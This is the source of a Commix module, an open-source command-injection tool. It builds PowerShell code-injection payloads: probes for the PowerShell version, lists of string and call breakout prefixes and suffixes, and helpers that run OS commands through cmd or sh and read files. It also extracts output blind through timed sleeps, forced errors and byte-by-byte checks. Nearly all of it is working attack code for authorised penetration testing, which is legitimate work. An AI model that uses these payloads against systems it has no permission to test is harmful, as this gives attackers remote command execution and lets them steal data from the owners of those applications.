#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2026 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

NAME = "powershell"

# The same name as it is written out to the user, where the switch's own spelling would read wrong.
LABEL = "PowerShell"

"""
An expression whose value says at once that code was evaluated, and which build evaluated it.

PSEdition tells apart the two families a version number alone would not: 'Desktop' is Windows
PowerShell (5.1, ships built into Windows itself), 'Core' is the cross-platform successor (6+, an
optional install anywhere including Linux and macOS) - the version alone repeats across both.
"""
PROBE = "$PSVersionTable.PSVersion.ToString()+$PSVersionTable.PSEdition"

# The probe on its own, and coerced to a string where the bare expression is not rendered as one.
PROBE_FUNCTIONS = ["" + PROBE + "",
  "[string](" + PROBE + ")",
  "(" + PROBE + ").ToString()"
]

# The same probes broken into the string being evaluated, one boundary per row - each row pairing a
# prefix with the suffix that closes it, the way the boundaries below are paired.
PROBE_PAYLOADS = [
  [x for x in PROBE_FUNCTIONS],
  ["+" + x for x in PROBE_FUNCTIONS],
  ["'+" + x + "+'" for x in PROBE_FUNCTIONS],
  ["\"+" + x + "+\"" for x in PROBE_FUNCTIONS],
  ["')+" + x + "+('" for x in PROBE_FUNCTIONS]
]

PROBE_PAYLOADS = [x for payload in PROBE_PAYLOADS for x in payload]

# What the probe's own value looks like coming back, and the complaints that say a payload reached
# an evaluated string even where nothing was rendered. The version itself is three parts on the
# cross-platform build and four on Windows PowerShell's own (5.1.19041.1682), so the last is optional.
PROBE_REGEX = r"(\d+\.\d+\.\d+(?:\.\d+)?)(?:Core|Desktop)"
WARNINGS = ["ParserError", "CommandNotFoundException", "is not recognized as the name of a cmdlet",
            "term is not recognized"]

"""
The language's own callables that run a command, widest first as the level rises.

Each is written as a bare name a payload can wrap in a call - none of them is how this grammar's own
'run()' actually reaches a command, which shells out directly rather than asking PowerShell's own
parser to read a foreign shell's syntax as if it were PowerShell's.
"""
EXECUTION_FUNCTIONS_LVL1 = ["Invoke-Expression", "iex"]
EXECUTION_FUNCTIONS_LVL2 = EXECUTION_FUNCTIONS_LVL1 + ["Invoke-Command"]
EXECUTION_FUNCTIONS_LVL3 = EXECUTION_FUNCTIONS_LVL2 + ["Start-Process"]

# Breaking out of the evaluated string, and closing it again behind the payload.
SEPARATORS_LVL1 = [""]
SEPARATORS_LVL2 = SEPARATORS_LVL1 + ["\n"]
SEPARATORS_LVL3 = SEPARATORS_LVL2 + ["\r\n"]

# The whole value as the expression, concatenation onto a value that is already one, and
# concatenation out of a quoted string the value sits inside.
PREFIXES_LVL1 = ["", "+", "'+", "\"+"]
# Closing a call the value sits inside, and a further argument to one.
PREFIXES_LVL2 = PREFIXES_LVL1 + ["')+", "\")+", "',", "\","]
# Ending the statement outright, where the sink runs statements rather than an expression.
PREFIXES_LVL3 = PREFIXES_LVL2 + ["';", "\";", ";", ")", "']", "\"]", "'}", "\"}"]

SUFFIXES_LVL1 = ["", "+'", "+\""]
# Closing the call again, and commenting out whatever the application appends behind it.
SUFFIXES_LVL2 = SUFFIXES_LVL1 + ["+('", "+(\"", "#"]
SUFFIXES_LVL3 = SUFFIXES_LVL2 + ["'#", "\"#", ")#", "]#", "}#", ",'", ",\""]

# How one of the functions above is reached, as a prefix a payload is wrapped in.
def execution_prefix(function):
  return function + "("

"""
Wrap the shell commands a payload runs in what this language renders them with.

There is no statement here that writes to the response the way another language's print does: what
the application renders is the value of the expression it evaluated, so the commands' output is
concatenated and handed back as that value.
"""
def print_statement(separator, commands, chain=None):
  if separator == "":
    return "+".join(run(command) for command in commands)
  return run((chain or separator).join(commands))

"""
The expressions every payload is built out of, spelled the way this language spells them.

What a technique asks of a sink is the same whichever language is evaluating: run this, tell me how
long the answer is, tell me its Nth byte, wait this long if the answer is yes. Only the spelling
differs - so the techniques ask through the names below, and a language is added by writing them
again rather than by touching a payload.
"""

# A single-quoted string literal holding the given text - the one quote it needs escaped by
# doubling, and nothing else: unlike a double-quoted string here, it reads no backslash or '$' as
# anything other than itself, which is exactly what a foreign shell's own command line is full of.
def _literal(text):
  return "'" + text.replace("'", "''") + "'"

"""
Run a command and yield its output.

'Invoke-Expression' reads a string as PowerShell's own syntax, not as a pass-through to whatever
shell the target's default one is - unlike another language's backtick or 'popen', which hand a
string to that shell however it is written. A command built for that other shell (cmd.exe's
'for /f' loops, or a POSIX one's '$(...)') is asked of it directly here instead.
"""
def run(cmd):
  from src.utils import settings
  if settings.TARGET_OS == settings.OS.WINDOWS:
    return "((cmd /c " + _literal(cmd) + " 2>&1) | Out-String)"
  return "((/bin/sh -c " + _literal(cmd) + " 2>&1) | Out-String)"

# Read a file and yield its contents.
def read_file(path):
  return "[IO.File]::ReadAllText(" + _literal(path) + ")"

# Drop trailing whitespace, so a length agrees with what a shell's own substitution would report.
def trim(expr):
  return "(" + expr + ").TrimEnd()"

# How many bytes an expression is.
def length(expr):
  return "(" + expr + ").Length"

"""
The ordinal of an expression's Nth byte, counting from zero.

Indexing a string past its end answers '$null' here rather than raising, and '[int]$null' is 0 - the
same "nothing there" answer every other language's grammar gives for the same case, reached for free
rather than built.
"""
def ordinal(expr, index):
  return "[int](" + expr + ")[" + str(index) + "]"

# An expression's value read as a number, for a command whose output is one - '[int]""' is 0 for the
# same reason the line above needs nothing extra either.
def to_number(expr):
  return "[int](" + expr + ")"

"""
Wait for as long as the condition is true, and no time at all when it is false.

'Start-Sleep' is a statement, not an expression, so it cannot sit inside the ternary Windows
PowerShell (5.1) does not have - '$(if (...) { ... } else { ... })' is the substitute every version
back to that one reads: a subexpression whose value is whatever its last statement's was.
"""
def delay(timesec, condition):
  return "$(if (" + condition + ") { Start-Sleep " + str(timesec) + " } else { 0 })"

"""
Stop the page where the condition does not hold, so what comes back says which it was.

'throw' is a statement too, reached the same way as the delay above. Uncaught, it unwinds the
current pipeline rather than the whole process - the same "this response differs from a satisfied
condition's" signal every other language's grammar reaches for here, without a long-running host
process paying for it the way one asked to exit outright would.
"""
def halt(condition):
  # Empty string rather than a number: the value is spliced into whatever the target was building,
  # and only a string leaves that expression intact for the page to render as it normally would.
  return "$(if (" + condition + ") { '' } else { throw 'x' })"

"""
Evaluate one expression and then another, within a single expression.

An array of the two, indexed for the second: PowerShell's ',' builds one eagerly, evaluating both
elements to construct it, so the first still runs for what it does rather than for what it returns.
"""
def sequence(first, second):
  return "(" + first + "," + second + ")[1]"

"""
The shell's comparison operators, as this language spells them - almost unchanged, since PowerShell
already spells its own the same way a POSIX 'test' does, not with another language's symbols. A
symbolic operator like '==' needs no space around it to still read as one word to its neighbours;
a worded one like '-eq' does, and a caller that concatenates the pieces with none of its own is why
each is given its own here rather than trusted to arrive already surrounded by some.
"""
COMPARISON = {"-le": " -le ", "-ge": " -ge ", "-lt": " -lt ", "-gt": " -gt ", "-eq": " -eq ", "-ne": " -ne "}

# What ends a statement, where the boundary being tested can carry one.
TERMINATOR = ";"

# eof
